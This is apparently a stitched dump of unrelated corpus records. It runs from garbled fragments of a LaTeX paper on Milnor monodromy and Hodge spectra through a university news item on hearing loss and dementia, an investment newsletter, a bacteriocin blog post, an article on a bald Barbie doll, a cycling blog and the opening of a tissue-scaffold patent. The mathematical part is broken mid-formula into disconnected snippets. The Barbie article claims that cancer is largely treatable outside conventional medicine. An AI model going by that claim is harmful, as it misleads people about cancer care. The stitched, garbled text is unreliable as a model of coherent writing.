${}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])$ defined by the weight filtration of the mixed Hodge module $\\psi_{f}^{H}(\\QQ^{H}_{\\CC^n}[n])$.\nMore generally, by using the exact functors $W_{k}\\colon

following lemma.\n\\begin{lem}\\label{compare3}\nFor any $\\lambda\\notin R_{f}$ and $k\\in\\ZZ$ we have an isomorphism in $\\DBC{\\{0\\}}\\simeq \\mathrm{D^b}(\\mathrm{Mod}(\\CC))\\colon$

$\\Perv{V}$:\n\\begin{align}\\label{con3ex}\n0\\to W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))\\to {}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])\\to

j^{-1}_{0}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])/W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])))\n\\end{align*}\nis an isomorphism.\nThus, by the proof of Theorem~\\ref{main1} the complexes \n$j^{-1}_{0}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))$,\\ \n$j^{-1}_{0}W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))$ and\n$j^{-1}_{0}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])/W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])))$ are perverse sheaves on $\\{0\\}$, i.e. their (perverse) cohomologies are concentrated in the degree $0$.\nTherefore, applying the functor $j_{0}^{-1}$ to the sequence (\\ref{con3ex}),\nwe obtain an exact sequence\n\\begin{align}\\label{con3ex2}\n0\\to j_{0}^{-1}W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))\\to j_{0}^{-1}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))\\to

preserves the property that a complex of mixed Hodge modules has weights $> k$,\n$j_{0}^{-1}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])/W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])))\\simeq j_{0}^{!}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])/W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])))$ has weights $> k$.\nTherefore, taking $W_{k}$ of the sequence (\\ref{con3ex2}),\nwe obtain\n\\begin{align}\\label{a0}\nW_{k}j_{0}^{-1}W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))\\simeq W_{k}j_{0}^{-1}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])).\n\\end{align}\nOn the other hand, since the functor $j_{0}^{-1}$ preserves the property that a complex of mixed Hodge modules has weights $\\leq k$,\n$j_{0}^{-1}W_{k}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))$ has weights $\\leq

the logarithm of the unipotent part of the monodromy automorphism of ${}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])$,\nand by $N_{0}$ its restriction to $0$, i.e. the logarithm operator of the unipotent part of $\\Phi_{n-1}$ of $j_{0}^{-1}({}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n]))\\simeq H^{n-1}(F_{f,0};\\CC)_{\\lambda}$.\nRecall that for any $k\\in\\ZZ_{\\geq 1}$\nwe

$H^{n-1}(F_{f,0};\\CC)_{\\lambda}$ coincides with the monodromy filtration centered at $n-1$.\n\\end{proof}\n\n\\begin{rem}\\label{newproof}\nWe can also prove Theorem~\\ref{main2} in the following way.\nFirst, we show the following general fact:\nfor a mixed Hodge module $\\calM$ on $\\CC^n$\nif the natural morphism $H^kj_{0}^{!}\\calM\\to H^kj_{0}^{*}\\calM$ is an isomorphism for any $k\\in \\ZZ$, \nthen we have the following:\n\\begin{enumerate}\n\\item[(i)] For $k\\neq 0$, we have $H^{k}j_{0}^{*}\\calM=0$.\n\\item[(ii)] The natural morphism $(j_{0})_{*}H^0j_{0}^{*}\\calM\\to \\calM$ is a monomorphism in $\\mathrm{MHM}(\\CC^n)$ and $(j_{0})_{*}H^0j_{0}^{*}\\calM$ is a direct summand of $\\calM$.\n\\end{enumerate}\nLet $\\calF$ be the underlying perverse sheaf of $\\calM$.\nWe remark that the natural morphism $H^kj_{0}^{!}\\calM\\to H^kj_{0}^{*}\\calM$ is an isomorphism for any $k\\in \\ZZ$\nif and only if the natural morphism $j_{0}^{!}\\calF\\to j_{0}^{-1}\\calF$ is an isomorphism since the functor $\\mathrm{MHM}(\\CC^n)\\lr \\Perv{\\CC^n}$ is faithful.\nNext, for $\\lambda\\notin R_{f}$ we consider the sub $\\RR$-mixed Hodge module $\\calM$ of $\\psi_{f}^{H}(\\RR^{H}_{\\CC^n}[n])$ such that the complexification of the underlying perverse sheaf is $\\calF={}^p\\psi_{f,\\lambda}(\\CC_{\\CC^n}[n])\\oplus {}^p\\psi_{f,\\bar{\\lambda}}(\\CC_{\\CC^n}[n])$.\nNote that $\\lambda\\notin R_{f}$ implies $\\bar{\\lambda}\\notin R_{f}$ by definition.\nThen, we can apply the above fact to $\\calM$ by Proposition~\\ref{compare1prop},\nand we thus obtain \n${}^p\\calH^{k}(j_{0}^{-1}\\calF)=0\\ (k\\neq 0)$ and\nthe filtration $(j_{0})_{*}(W_{\\bullet}{}^p\\calH^0j_{0}^{-1}\\calF)(=W_{\\bullet}(j_{0})_{*}{}^p\\calH^{0}j_{0}^{-1}\\calF)$ is a direct summand of $W_{\\bullet}\\calF$.\nIn this way, we can deduce the isomorphism (\\ref{monofilmilAD}) from the isomorphism (\\ref{monofil}), and we get Theorem~\\ref{main2}.\n\\end{rem}\n\n\\begin{rem}\nLet $f\\in \\CC\\{x_{1},\\dots,x_{n}\\}$ be a convergent power series with $f(0)=0$.\nIn this case, we can also define the notions in Section~\\ref{chapmil}:\nthe Milnor fiberation, the Milnor fiber $F_{f,0}$, the Milnor monodromies $\\Phi_{j}\\colon H^{j}(F_{f,0};\\CC)\\simar H^{j}(F_{f,0};\\CC)$, the Newton polyhedron $\\Gamma_{+}(f)$, the non-degeneracy at $0$ and the finite set $R_{f}\\subset \\CC$, similarly to the case where $f$ is a polynomial.\nWe can also consider a (analytic) mixed Hodge module $\\psi_{f}(\\QQ^{H}_{\\CC^n}[n])$ and a mixed Hodge structure $H^{k}j_{0}^{*}(\\psi_{f}(\\QQ^{H}_{\\CC^n}[n]))$, whose underlying vector space is $H^{k+n-1}(F_{f,0};\\QQ)$ for $k\\in \\ZZ$.\nAssume that $f$ is non-degenerate at $0$.\nThen, even in this setting we can prove Proposition~\\ref{compare1prop}, Theorem~\\ref{main1}, Proposition~\\ref{compare1propgen}, Lemma~\\ref{compare3} and Theorem~\\ref{main2} in the same way\n(We remark that we do not have the $6$-operations between the derived categories of (analytic) mixed Hodge modules on analytic spaces in general. Therefore we have to be careful to use $\\mathrm{D^bMHM}(\\CC^n)$ in the proof of Lemma~\\ref{compare3}. Nevertheless, in this setting, we have the functors $j_{0}^{*}$ and $j_{0}^{!}$ as in the case of the derived categories of algebraic mixed Hodge modules (see section 2.30 of \\cite{MHM}). Thus, the same proofs work even in the case where $f$ is a covergent power series.).\\\\\nThe proof in Remark~\\ref{newproof} works even in the analytic setting.\nTherefore, also in this way, we obtain Theorem~\\ref{main1} and \\ref{main2} for a convergent power series $f$.\n\\end{rem}\n\n\n\\section{Applications}\n\nIn this section,\nwe apply Theorems~\\ref{main1} and \\ref{main2}\nto compute the Jordan normal forms of the Milnor monodromies and\nthe Hodge spectra.\nLet $f(x)\\in\\nPoly$ be a polynomial such that $f(0)=0$.\nAssume that it is non-degenerate at $0$.\nLet $P$ be the convex hull of $\\Ntbd\\cup\\{0\\}$.\nSince our formula below will become trivial in the case when the dimension of $P$ less than $n$,\nin what follows we assume that the dimension of $P$ is equal to $n$.\nMoreover, since the case where $f$ is convenient was already treated by Matsui-Takeuchi~\\cite{MT} and M. Saito~\\cite{Mexp},\nwe assume that $f$ is not convenient in this section.\nThen $R_{f}$ is not empty and contains $1\\in\\CC$. \nFor $\\lambda\\notin R_{f}$, by Proposition~\\ref{propsymEpoly}, we have \n\\[u^2E_{\\lambda}(F_{f,0};u,u)\n=(-1)^{n-1}l^{*}_{\\lambda}(P,\\nu;u,u),\n\\]\nwhere $\\nu$ is the piecewise linear function on $P$ defined in Section~\\ref{chaphreal}.\nRecall that $\\calS_{\\nu}$ is the polyhedral subdivision of $P$ defined by $\\nu$.\nBy the definition of the $h^*$-polynomial, for $\\lambda\\notin R_{f}$ we have\n\\[l^{*}_{\\lambda}(P,\\nu;u,u)=\n\\sum_{F\\prec\\Ntph\\sumcom{admissible}}u^{\\dim{\\Delta_{F}}+1}\nl^{*}_{\\lambda}(\\Delta_{F},\\nu;1)\\cdot l_{P}(\\calS_{\\nu},\\Delta_{F};u^2),\\]\nwhere in the sum $\\Sigma$ the face $F$ ranges through the compact admissible ones of $\\Ntph$.\nThe polynomial $l_{P}(\\calS_{\\nu},\\Delta_{F};t)$ is symmetric and unimodal centered at $(n-\\dim{F}-1)/2$, i.e. if $a_{i}\\in \\ZZ$ is the coefficient of $t^i$ in $l_{P}(\\calS_{\\nu},\\Delta_{F};t)$ we have $a_{i}=a_{n-\\dim{F}-1-i}$ and $a_{i}\\leq a_{j}$ for $0\\leq i\\leq j\\leq (n-\\dim{F}-1)/2$.\nTherefore, it can be expressed in the form\n\\[l_{P}(\\calS_{\\nu},\\Delta_{F};t)=\\sum_{i=0}^{\\lfloor (n-1-\\dim{F})/2\\rfloor}\\tl{l}_{F,i}(t^i+t^{i+1}+\\dots+t^{n-1-\\dim{F}-i}),\\]\nfor some non-negative integers $\\tl{l}_{{F},i}\\in\\ZZ_{\\geq 0}$.\nWe set\n\\[\\tl{l}_{P}(\\calS_{\\nu},\\Delta_{F},t):=\\sum_{i=0}^{\\lfloor (n-1-\\dim{F})/2\\rfloor}\\tl{l}_{F,i}t^i.\\]\nFor $k\\in\\ZZ_{\\geq 0}$ and $\\lambda\\in\\CC$ we denote by $J_{k,\\lambda}$ the number of the Jordan blocks in $\\Phi_{n-1}$ with size $k$ for the eigenvalue $\\lambda$.\nThen by Theorems~\\ref{main1} and \\ref{main2}\nwe obtain the following formula for them.\n\n\\begin{cor}\\label{jordan}\nIn the situation as above, \nfor any $\\lambda\\notin R_{f}$ we have\n\\begin{align*}\n\\sum_{0\\leq k\\leq n-1}J_{n-k,\\lambda}u^{k+2}\n=\\sum_{\\substack{F\\prec\\Ntph\\sumcom{admissible}}}\nu^{\\dim{\\Delta_{F}}+1}l^{*}_{\\lambda}(\\Delta_{F},\\nu;1)\\cdot\\tl{l}_{P}(\\calS_{\\nu},\\Delta_{F};u^2),\n\\end{align*}\nwhere in the sum $\\Sigma$ of the right hand side the face $F$ ranges through the admissible ones of $\\Ntph$.\n\\end{cor}\n\nFinally, we introduce our formula for the Hodge spectrum of $f$ at the origin $0$.\n\\begin{defi}\n\\begin{enumerate}\n\\item\nWe define a Puiseux polynomial $\\mathrm{sp}_{f,0}(t)$ with coefficients in $\\ZZ$ by\n\\[\\mathrm{sp}_{f,0}(t)=(-1)^{n-1}\\sum_{\\alpha\\in\\QQ\\cap[0,n]}\\left\\{\\sum_{j\\in\\ZZ}(-1)^{j}\\dim{\\GR^{\\lfloor{n-\\alpha}\\rfloor}_{F}\\tl{H^j}(F_{f,0};\\CC)_{\\exp(-2\\pi\\sqrt{-1}\\alpha)}} \\right\\}t^{\\alpha},\\]\nwhere $\\GR^{\\lfloor{n-\\alpha}\\rfloor}_{F}\\tl{H^j}(F_{f,0};\\CC)_{\\exp(-2\\pi\\sqrt{-1}\\alpha)}$\nis the graded piece with respect to the Hodge filtration of the mixed Hodge structure of $\\tl{H}^j(F_{f,0};\\QQ)$.\nWe call it the \\textit{Hodge spectrum of $f$ at $0$}.\n\\item For $\\beta\\in (0,1)\\cap \\QQ$ we set $\\lambda=\\exp(2\\pi\\sqrt{-1}\\beta)$ and we define a Puiseux polynomial $\\Sp_{f,0}^{\\lambda}(t)$ by\n\\[\\Sp_{f,0}^{\\lambda}(t)=(-1)^{n-1}\\sum_{i=0}^{n-1}\\left\\{\\sum_{j\\in\\ZZ}(-1)^{j}\\dim{\\GR^{\\lfloor{n-\\beta-i}\\rfloor}_{F}\\tl{H^j}(F_{f,0};\\CC)_{\\lambda^{-1}}}\\right\\}\nt^{\\beta+i}.\\]\n\\end{enumerate}\n\\end{defi}\nSince $f$ is non-degenerate at $0$,\nby setting $v=1$ in Corollary~\\ref{epolycomp1} we can express $\\Sp_{f,0}(t)$ and $\\Sp_{f,0}^{\\lambda}(t)$ in terms of $\\Gamma_{f}$.\nMoreover, \nif $\\lambda=\\exp(2\\pi\\sqrt{-1}\\beta)$ is not in $R_{f}$,\n$\\Sp_{f,0}^{\\lambda}(t)$ can be rewritten much more simply as follows.\nFor a compact face $F$ of $\\Ntph$, we define a cone $\\mathrm{Cone}(F)\\subset \\RR^n$ by $\\mathrm{Cone}(F):= \\RR_{\\geq 0}F$\nand the linear function $h_{F}$ on $\\mathrm{Cone}(F)$ which takes the value $0$ at the origin $0\\in\\RR^n$ and the value $1$ on $F$.\nMoreover, for $\\beta\\in(0,1)\\cap \\QQ$\nwe define a Puiseux polynomial $P_{F,\\beta}(t)$ by\n\\[P_{F,\\beta}(t):=\\sum_{i=0}^{+\\infty}\\#\\{v\\in \\mathrm{Cone}(F)\\cap \\ZZ^n_{\\geq 0} \\ |\\ h_{F}(v)=\\beta+i\\}t^{\\beta+i}.\\]\nThen we obtain the following formula,\nwhich generalizes the one for $\\Sp_{f,0}(t)$ in the case where $0\\in V$ is an isolated singular point obtained by M.

An article summarising the results of the research appears on the University's website.\nIt is hoped that this new understanding may be a significant step towards advancing research into Alzheimer's disease and how to prevent the illness for future generations.\nNewcastle experts considered three key aspects; a common underlying cause for hearing loss and dementia; lack of sound-related input leading to brain shrinking; and cognitive impairment resulting in people having to engage more brain resources to compensate for hearing loss, which then become unavailable for other tasks.\nThe team propose a new angle which focuses on the memory centers deep in the temporal lobe. Their recent work indicates that this part of the brain, typically associated with long-term memory for places and events, is also involved in short-term storage and manipulation of auditory information.\nThey consider explanations for how changes in brain activity due to hearing loss might directly promote the presence of abnormal proteins that cause Alzheimer's disease, therefore triggering the disease.\nProfessor Tim Griffiths, from Newcastle University's Faculty of Medical Sciences, said: \"The challenge has been to explain how a disorder of the ear can lead to a degenerative problem in the brain.\n\"We suggest a new theory based on how we use what is generally considered to be the memory system in the brain when we have difficulty listening in real-world environments.\"\nWork on mechanisms for difficult listening is a central theme for the research group, including members in Newcastle, UCL, and Iowa University, that has been supported by a Medical Research Council program grant.\nDr Will Sedley, from Newcastle University's Faculty of Medical Sciences, said: \"This memory system engaged in difficult listening is the most common site for the onset of Alzheimer's disease.\n\"We propose that altered activity in the memory system caused by hearing loss and the Alzheimer's disease process trigger each other. Researchers now need to examine this mechanism in models of the pathological process to test if this new theory is right.\"\nThe experts developed the theory of this important link with hearing loss by bringing together findings from a variety of human studies and animal models. Future work will continue to look at this area.\nOriginal Paper: Griffiths TD, Lad M, Kumar S, et al. How can hearing loss cause dementia?

The S&P 500 broke through 2,500 to close the month up another 1.93%, while the VIX set a record for the lowest monthly close over the past 30 years. Surprisingly, there wasn't a shortage of newsworthy events over the past month. Any one of the following could have ignited at the very least a shallow correction, but the market just seems to not care.\nNorth Korea launched their 14th ballistic missile of 2017 and set off a hydrogen bomb that proved to be their strongest nuclear test to date.\nFollowing the devastation in Texas from Hurricane Harvey, Hurricane Irma unleashed its wrath on the Southeast. These disasters were soon followed up with the decimation of Puerto Rico by Hurricane Maria.\nThe credit of 145.5 million Americans was potentially affected by a data breach on Equifax \u2013 the irony is surely not lost on us!\nMore of the same in Washington DC \u2013 nothing can get accomplished. The health care bill is pushed into 2018, because it doesn't have enough votes to pass. It doesn't matter if you are a Republican, Democrat or Independent, I think we can all agree that the politicians representing us appear to be inept. A party had seven years to come up with a solution to something they disagreed with at the outset and still couldn't agree amongst themselves to a fix. It is truly remarkable! The enthusiasm over tax reform getting passed this year, or ever for that matter, might be getting a little ahead of itself.\nAfter years of QE and an ever-expanding balance sheet by the U.S. Federal Reserve, Janet Yellen finally announced a plan for Quantitative Tightening (QT). QT is set to begin this month with a $10 billion runoff that will increase by another $10 billion every three months until this time next year. At that time, the runoff will be $50 billion and will continue at that pace until 2022.\nThe lack of volatility to newsworthy events has become rather commonplace recently. On numerous occasions, I have pointed out the historic nature of this year's volatility. The following chart, from Bespoke, is just another way to show the lethargic daily moves in the S&P 500. According to Baird and Bespoke, 2017 now ranks as the second least volatile year through the first 188 trading days going back to 1928.\nNot only was September a quite month in the market as a whole, but it was a quiet month as far as transactions go at the firm level. The only trade we made was to liquidate our remaining small position in Bank of the Ozarks (OZRK)*. For the sake of time, you can read up on the reasons behind the OZRK liquidation in last month's Observations column.\nEven though it was quiet on the transaction front, we had a little bit of noise being made in a couple of our holdings \u2013 for both the good and bad. Let's get the bad news out of the way first. Scana (SCG)** was down 19.7% in September on news they received a subpoena related to their alleged attempt to hide the fact that construction of two nuclear reactors was doomed years ago due to unforeseen cost overruns. State regulators, customers, and shareholders of SCG were outraged to hear the allegations and so the witch hunt has begun. So far, the steady drumbeat of bad press has placed constant pressure on the stock price. However, the CDS (credit default swaps) and bond prices have held up extremely well. These securities are not currently exhibiting any stress, which as of now takes any question of their solvency off the table. Obviously, current events with a company under investigation can change rather quickly, so it would be worth noting to always keep one eye on the direction of their bond prices.\nRegular readers might recall in past columns having seen SCG as an example of our buy and sell discipline. In the early summer of 2015, we had owned a very small position in SCG when our quantitative models flashed a buy signal with the stock trading in the low $50s. So, we followed our buy discipline and bought the stock up to a 3% position. Not much more than a year later, a sell signal was triggered and we took advantage of the opportunity to sell shares in the high $60s to low $70s. Our sales brought the position size down close to where it is today. SCG is the third smallest position in our Large Cap Core strategy at 1.07%, so the business specific risk on the portfolio as a whole is limited.\nNow on to the good! Abbvie (ABBV)***, the largest holding in our Large Cap Core strategy, was up 18% in September on a patent victory and timely results from their pipeline. At the beginning of the month, the U.S. Patent Office refused a request from Coherus to review a patent on ABBV's best-selling therapy, Humira. Earlier in the year, Coherus filed several petitions to review the patents, which put a lid on any stock price appreciation. The denial to review the patent on Humira allows ABBV to continue keeping biosimilars out of the U.S. market for another five years. Later in the month, Amgen (AMGN) settled with ABBV on their push to release a Humira biosimilar. ABBV is allowing AMGN to sell their biosimilar in Europe starting next year and in the U.S. by 2023. In exchange, AMGN is dropping any further patent challenges and agreeing to pay royalties to ABBV on future sales of its Humira biosimilar. Basically, ABBV has bought itself a few more years to reap the benefits of their cash cow, also known as Humira, while developing their pipeline so they can replace lost revenues in the future.\nWe continue to hold ABBV in both our Large Cap Core and Equity strategies with no immediate plan to add to or sell any of our position. Fundamentally, we have been monitoring the Humira patent news for several years now, as it could affect the sustainability of future profit and cash flow growth. Quantitatively, the stock is ranked a hold, but after a sharp 18% jump over the course of a few weeks, you can imagine it is getting ever closer to producing a sell signal. However, for the time being, we will sit tight and enjoy the ride on the composite level. And, for our new accounts, we will continue to incrementally build a position on any weakness.\nBack in June of this year, I included a quote from Seth Klarman who is the Founder and CEO of Baupost Group. For whatever reason it really stuck to me and I have found myself citing the quote several times over the past couple of weeks. So, I thought it was pertinent to use again in light of where we find ourselves in today's environment.\n* OZRK was sold across all strategies (Tandem Large Cap Core, Equity, and Mid Cap Core).\n** SCG is owned across Tandem Large Cap Core and Mid Cap Core.\n*** ABBV is owned across Tandem Large Cap Core and Equity.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 12314}
{"text": "Implant infection\n10 Facts on Bacteriocins\nPosted by thespace\nBacteriocins are a group of antimicrobial peptides produced by bacteria, capable of controlling clinically relevant and drug-resistant bacteria. They represent a potential drug alternative for replacing current antibiotics to treat diseases caused by resistant bacteria. As we know, the world is facing a significant increase in infections caused by drug-resistant infectious agents. For this reason, bacteriocins are strong candidates to be used as therapeutic agents.\nSterify products exploit the antimicrobial activity of nisin, a polycyclic antibacterial peptide produced by the bacterium Lactococcus lactis that is used as a food preservative. In this article we wanted to share some interesting facts about this new class of antimicrobial agents, exploring and summarizing a recent overview published on frontiers.\nBacteriocins were first discovered by Andr\u00e9 Gratia in 1925. He was involved in the process of searching for ways to kill bacteria, which also resulted in the development of antibiotics and the discovery of bacteriophage, all within a span of a few years. He called his first discovery \"colicine\" because it killed E. coli.\nBacteriocins display a non-toxic behavior at in vitro assays (Cebri\u00e1n et al., 2019). This is also confirmed in vivo and clinically. Numerous researches have examined the biosafety and toxicity of bacteriocins utilizing a variety of administration methods, including oral, intraperitoneal, nasal, and topical. In particular, topical application of bacteriocins has been reported to be successfully tested for skin infection with no toxicity effects.\nBacteriocins can be naturally synthetized by native producers. This mechanism exploits the bacteriocins excretion by dedicated membrane-associated ATP-binding cassette (ABC) transporters or by the general secretion pathway of the cell (Munoz et al., 2011). Bacteriocins can also be naturally synthetized by heterologous producers to increase the bacteriocin production yield from native producers by facilitating the control of gene expression or increasing the production levels. Bacteriocins can be also chemically synthetized.\nAs expected, bacteriocins have an outstanding record to kill or reduce pathogens and drug-resistant pathogens during in vitro assessments (Fuchs et al., 2011; Cui et al., 2012; Gabrielsen et al., 2014; Ishibashi et al., 2014; Al Atya et al., 2016; Jiang et al., 2017; Aguilar-P\u00e9rez et al., 2018; Ansari et al., 2018; Denkovskien\u0117 et al., 2019; Peng et al., 2019; Newstead et al., 2020).\nAlthough it is a fact that the current literature for bacteriocins produced from Gram-negative bacteria is dominated by bacteriocins toward Gram-positive bacteria (Jamali et al., 2019), there is an acceptable amount of bacteriocins reported to have a strong activity against Gram-negative bacteria, including the pathogenic strains, e.g., the S-type pyocin group from the P. aeruginosa (Ghequire and De Mot, 2014), or the microcin and colicin groups that are vastly reported for E. coli.\nUnlikely to antibiotics, bacteriocins can be engineered to attach anywhere on the cellular outer membrane because they do not have a specific receptor (Bonhi and Imran, 2019) and they can be produced in situ by probiotics (Dobson et al., 2012; O'Shea et al., 2012).\nBacteriocins are categorized in several ways, including producing strain, common resistance mechanisms, and mechanism of killing. Methods of killing include: pore-forming, nuclease activity, peptidoglycan production inhibition. The naming system is problematic for several reasons. First, it would be more accurate to name bacteriocins according to what they kill if their killing spectrum coincided with genus or species names. However, the bacteriocins frequently possess spectra that exceed the bounds of their named taxa and almost never kill the majority of the taxa for which they are named. Additionally, the bacteriocin's initial name usually comes from the organism that produces it rather than the specific strain that it kills. Because of this, using this name system as a theoretical foundation is challenging.\nAs of 2016, nisin was the only bacteriocin generally recognized as safe by the FDA and was used as a food preservative in several countries. Furthermore, bacteriocins active against E. coli, Salmonella and Pseudomonas aeruginosa have been produced in plants with the aim for them to be used as food additives. Moreover, it has been recently demonstrated that bacteriocins active against plant pathogenic bacteria can be expressed in plants to provide robust resistance against plant disease.\nAccording to 2019 WHO's Antibacterial Agent in Preclinical Development Book, 27 of 252 antimicrobial agents in preclinical revision status are considered as antimicrobial peptides. In an independent study, Theuretzbacher et al. (2020) identified the current global antibacterial pipeline and found that 135 of 407 preclinical projects from 314 private and public institutions were related to producing synthetic and natural antimicrobial peptides, natural products, and LpxC inhibitors, and most of these molecules are targeting Gram-negative bacteria.\nThe future of this new class of therapeutic agents is intriguing and may lead to novel discoveries. Fields et al. (2020) were the first to design the very first fully de novo bacteriocin by using a machine-learning approach. Acu\u00f1a et al. (2012) were able to design chimeric bacteriocins that retained the properties to kill both Gram-positive and Gram-negative bacteria. Moreover, other authors have preferred to repurpose the bacteriocins by exploiting their capability against tumor cells (Varas et al., 2020).\nPlease fill out the form, tell us how we can help, and we will get in touch with you shortly by email or phone.\ninfo@sterify.it\nVia Nizza 262/1 10126 Turin \u2013 Italy\nType your e-mail*\nType your message*\n*I accept Privacy Policy and the use of Cookie Policy.\nSterify SRL\nVia Nizza 262/1, 10126 Turin - Italy\nSterify\nSTERIFY 2022 - Web Agency\nAre you a Medical Operator?\nIn compliance with the provisions of current legislation, I declare under my responsibility to be a professional in the sector and to be authorized to view the content on this website.

According to News.com.au, the bald-headed doll, which will be dubbed \"a friend of Barbie,\" is set to be released in 2013, and will come with an assortment of head dressings and clothing commonly worn by real-life female cancer victims.\nCancer rates are apparently skyrocketing so much in the U.S. today -- even among children -- that certain individuals feel Mattel should release a cancer-stricken Barbie doll for children in order to keep up with this disastrous trend. These individuals, in other words, appear to fully endorse the bizarre materialization of one of America's most deadly conditions into a children's toy.\n\"We would like to see a Beautiful and Bald Barbie made to help young girls who suffer from hair loss due to cancer treatments, alopecia or trichotillomania,\" says a petition written to Mattel by Beautiful and Bald Barbie, the Facebook group that first promoted the idea. \"Also, for young girls who are having trouble coping with their mother's hair loss from chemo. Many children have some difficulty accepting their mother, sister, aunt, grandparent or friend going from long-haired to bald.\"\nMattel says it will not actually sell the \"Beautiful and Bald Barbie\" in retail stores, but rather it will distribute it to children with cancer in hospitals throughout the U.S. and Canada. Some of the cancer dolls will also reportedly be offered to charity partners on other continents as well, as an act of goodwill towards those suffering from cancer globally.\nYou can see a rendering of cancer Barbie at:\nhttp://articles.nydailynews.com\nAs generous and well-meaning as this initiative is, one cannot help but notice the disturbing symbolic implications of a Barbie doll with cancer. Since Barbies were originally created as a fashion doll for young girls to relate to, the concept of a Barbie doll with cancer not only shows just how prevalent this horrible disease has become, but also how cancer is becoming typecasted as commonplace and fashionable.\nIn the same way that creating an obese Barbie or a Barbie with leprosy, for instance, would be a morbid venture, creating a Barbie with cancer only helps to normalize a devastating condition that is largely avoidable and treatable outside the conventional medical paradigm. Rather than attempt to turn cancer into a type of cultural paragon, perhaps the \"Beautiful and Bald Barbie\" group, as well as Mattel, could funnel their well-intentioned efforts into promoting cancer prevention and alternative cancer treatments.\nhttp://www.news.com.au\nhttps://www.naturalnews.com/cancer_prevention.html\nBarbie at FETCH.news", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 39335}

{"text": "As we enter summer I've noticed more people pedaling to work along my route each morning. Riders sharing my route come and go, there are some regulars with whom I exchange greetings and smalltalk about the weather or traffic, but there are few you see every day and few who stand out from the crowd.\nRecently though one fellow has got my attention. Its partly because he is cycling dressed in a suit, minus the jacket, even as the temperature pushes beyond 30 degrees and partly because he is riding an ordinary shopping bike in the traffic. But the thing that first grabbed my attention was his pedaling style which can only be described as frog-like. With one heel on each pedal and knees pointing 90 degrees out from the frame rather than parallel to it, he cranks his bicycle at quite a clip looking like some kind of giant animated frog.\nBut above all this unlikely cyclist has my attention because I'm watching to see just what kind of accident eventually kills him.\nYou see this fellow takes great delight in being ahead of everyone else. At a red light he creeps from behind into pole position, cunningly watching the lights and leading out when he expects them to turn green. He'll pump his frog legs in a comical fashion to get up to speed and leave us all in his dust. Well, at least until a few meters down the road when he is caught up and easily overtaken.\nIn order to regain first place in his imaginary race this guy takes extraordinary risks to his safety. He'll run red lights at smaller intersections without checking if they're clear. He'll race down the inside of moving traffic oblivious to the drivers blind spots, oblivious to those turning into side streets, and those emerging from them. When the space between car and sidewalk is too narrow he'll jump onto the sidewalk, then swerve back out into traffic with barely a glimpse behind him. I've seen him attempt to adjust something on his frame while drifting into on-coming traffic, almost colliding with the car in front of him as he quickly returned to his own lane.\nAll this time myself and other riders who value our lives are playing it safe yet manage to repeatedly overtake him, as when he is not being Evel Knievel he is understandably slow, what with his suit, mama-chari and amphibian pedaling style.\nJust this morning after a similar series of events frog legs was out in front coming up to a traffic light which marks the end of his race, for it is at this light his 'competition' disperses in different directions. I watched him speed up as the light turned orange, then as the light turned red he entered the intersection and sat up in the saddle as if he had just won a stage victory in the Tour de France.\nI've witnessed him in action about 3 times now and fully expect to see him in an accident right before my eyes. While I love a spectacular crash as much as the next guy I don't want to see frog legs get himself injured or killed.\nBut what can I can do to prevent it from happening? I'm quite aware of the danger he is in, is he? Do I collar him at a red and give him some friendly advice? Do I avoid overtaking him knowing that will just fuel his desire to get ahead again. Would he ride like an idiot regardless of his perceived place in the \"race\"?\nAt the end of the day he is a grown man, responsible for his own decisions and actions. I'd hate to see him in an accident, but its already enough work just looking out for myself out there.\nI think I'll let natural selection run its natural course.\nSometimes, people have to make their own mistakes.

{"text": "The present invention relates to a biocompatible, three-dimensional scaffold useful to grow cells and to regenerate or repair tissue in predetermined orientations. The scaffold is particularly useful for regeneration and repair of cardiac tissue. The scaffold contains layers of alternating A-strips and S-strips, wherein the A-strips within each layer are aligned parallel to each other and preferentially promote cellular attachment over attachment to the S-strips. Methods of producing and implanting the scaffold are also provided.\nThe present application is a divisional of application Ser. No. 10/892,518, filed Jul. 15, 2004, now U.S. Pat. No. 7,384,786 which claims the benefit of priority to U.S. Provisional Application Ser. No. 60/487,909, filed Jul. 16, 2003, the entire contents of each of which are hereby incorporated by reference in their entirety.\nBiocompatible and biodegradable scaffolds are used in tissue reconstruction and repair. The scaffold, for example, can serve as both a physical support and adhesive substrate for cells during in vitro culturing and subsequent implantation in vivo. Scaffolds are utilized to deliver cells to desired sites in the body, to define a potential space for engineered tissue, and to guide the process of tissue development. Cell transplantation on scaffolds has been explored for the regeneration of skin, heart, nerve, liver, pancreas, cartilage, and bone tissue using various biological and synthetic materials. Scaffolds have also been implanted directly into patients without prior culturing of cells in vitro. In this case, the initially cell-free scaffold needs to be designed in a manner that cells from the surrounding living tissue can attach to the scaffold, migrate into it and form functional tissue.\nSynthetic materials, such as polyester fiber (e.g., DACRON\u2122) or polytetrafluoroethylene (PTFE) (e.g., TEFLON\u2122), have been extensively used as implants to replace diseased or damaged body parts. However, these materials have enjoyed limited success because of their poor biocompatibility. Synthetic materials frequently cause persistent inflammatory reactions and are further limited by their lack of biodegradation, which results in the failure of the body to integrate and/or remodel these materials into the surrounding tissue. Other synthetic materials that are 